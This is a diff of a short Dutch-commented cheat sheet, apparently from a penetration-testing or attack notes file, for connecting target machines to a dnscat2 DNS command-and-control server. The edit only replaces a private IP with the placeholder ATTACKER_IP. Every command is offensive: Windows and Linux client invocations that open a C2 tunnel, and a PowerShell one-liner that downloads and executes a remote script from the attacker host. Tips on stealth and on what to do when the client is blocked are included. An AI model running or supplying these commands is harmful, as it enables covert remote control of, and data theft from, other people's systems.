@@ -1,12 +1,12 @@
 # dnscat2 Client - Verbind target met DNS C2 server
 # Windows client (pre-compiled):
-.\dnscat2-v0.07-client-win32.exe --dns server=10.0.0.1,port=53 --secret=sharedsecret
+.\dnscat2-v0.07-client-win32.exe --dns server=ATTACKER_IP,port=53 --secret=sharedsecret
 # Via domein (meer stealthy, gaat via DNS resolver):
 .\dnscat2-v0.07-client-win32.exe tunnel.domain.local --secret=sharedsecret
 # Linux client:
-./dnscat --dns server=10.0.0.1,port=53 --secret=sharedsecret
+./dnscat --dns server=ATTACKER_IP,port=53 --secret=sharedsecret
 # PowerShell client (geen binary nodig):
-powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/tools/dnscat2.ps1'); Start-Dnscat2 -Domain tunnel.domain.local -DNSServer 10.0.0.1"
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/tools/dnscat2.ps1'); Start-Dnscat2 -Domain tunnel.domain.local -DNSServer ATTACKER_IP"
 # Tip: Gebruik --secret om MitM te voorkomen
 # Tip: Windows client blokkeert soms - probeer dan de PowerShell variant
 # Tip: Max ~500 bytes per DNS query - grote transfers duren lang
